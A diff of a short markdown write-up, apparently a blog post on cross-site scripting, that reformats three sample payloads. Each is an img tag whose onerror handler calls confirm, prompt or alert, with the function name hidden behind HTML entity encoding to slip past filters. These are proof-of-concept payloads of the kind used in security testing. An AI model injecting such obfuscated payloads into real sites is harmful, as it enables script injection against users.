@@ -27,9 +27,18 @@ Have you ever seen something like this before? Probably yes, but it becomes incr
 so i will provide some script as example if you want to use them, it will be prompt and alert and confirm functions.
 
 # here
-```<img src=x onerror=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;('XSS')>``` for confirm
-```<img src=x onerror=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;('XSS')>``` for prompt
-```<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS')>```and this is for alert
+```
+<img src=x onerror=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;('XSS')>
+```
+for confirm
+```
+<img src=x onerror=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;('XSS')>
+```
+for prompt
+```
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS')>
+```
+and this is for alert
 
 
 ## Thanks for reading 
